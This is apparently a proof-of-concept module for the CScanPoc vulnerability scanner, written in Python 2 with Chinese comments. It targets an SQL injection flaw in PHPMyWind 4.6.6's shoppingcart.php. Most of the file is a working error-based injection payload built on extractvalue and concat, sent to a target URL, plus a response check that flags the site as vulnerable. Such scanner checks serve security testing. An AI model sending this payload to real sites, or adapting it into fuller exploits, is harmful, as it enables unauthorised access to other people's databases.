# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'PHPMyWind_0001' # 平台漏洞编号，留空
    name = 'PHPMyWind SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-02-24'  # 漏洞公布时间
    desc = '''
        PHPMyWind SQL注入漏洞：
        /phpmywind/shoppingcart.php?a=a
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHPMyWind'  # 漏洞应用名称
    product_version = '4.6.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ca3f0a12-c537-4868-8f6c-43377c9a6b59'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            #No.1 refer=http://www.wooyun.org/bugs/wooyun-2010-048454
            payload = "/phpmywind/shopingcart&typeid=1/phpmywind/shoppingcart.php?a=a%20or%20@`\'`=1%20and%20extractvalue(1,concat(0x5c,md5(1)))%20and%20@`\\\'`"
            target = self.target + payload
            code, head, body, errcode, final_url = hh.http(target);

            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
                #security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
